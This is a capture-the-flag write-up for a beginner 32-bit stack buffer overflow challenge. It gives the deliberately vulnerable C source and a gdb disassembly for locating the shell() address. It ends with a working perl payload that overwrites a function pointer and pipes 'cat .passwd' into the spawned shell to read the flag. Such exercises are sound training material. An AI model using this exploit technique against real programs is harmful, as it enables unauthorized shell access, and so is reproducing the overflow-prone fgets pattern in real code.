## ELF32 - Stack buffer overflow basic 2

| Author | Level | Points |
| ------ | ----- | ------ |
| Lyes | Very Easy | 10 |

> An intermediate level to familiarize yourself with stack overflows
>
><b> Statement </b> <br />
>Environment configuration : 
> * [ ] Postion Independent Executable 
> * [ ] Read Only relocations
> * [x] Non-Executable Stack 
> * [x] Non-Executable Heap 
> * [ ] Address Space Layout Randomisation 
> * [ ] Source Fortification 
> * [x] Source code access
>
>Source code :
>
>```c
>/*
>gcc -m32 -fno-stack-protector -o ch15 ch15.c
>*/
> 
>#include <stdio.h>
>#include <stdlib.h>
> 
>void shell() {
>    system("/bin/dash");
>}
> 
>void sup() {
>    printf("Hey dude ! Waaaaazzaaaaaaaa ?!\n");
>}
> 
>main()
>{ 
>    int var;
>    void (*func)()=sup;
>    char buf[128];
>    fgets(buf,133,stdin);
>    func();
>}
```

#### Solution

First, find address of `shell` function

```
gdb-peda$ pdisas shell
Dump of assembler code for function shell:
   0x08048464 <+0>:     push   ebp
   0x08048465 <+1>:     mov    ebp,esp
   0x08048467 <+3>:     sub    esp,0x18
   0x0804846a <+6>:     mov    DWORD PTR [esp],0x80485a0
   0x08048471 <+13>:    call   0x8048380 <system@plt>
   0x08048476 <+18>:    leave
   0x08048477 <+19>:    ret

End of assembler dump.
```

Then, we know `shell` function started from `0x08048464` and get the flag with

```
(perl -e 'print "a"x128 . "\x64\x84\x04\x08";'; echo 'cat .passwd') | ./ch15
```
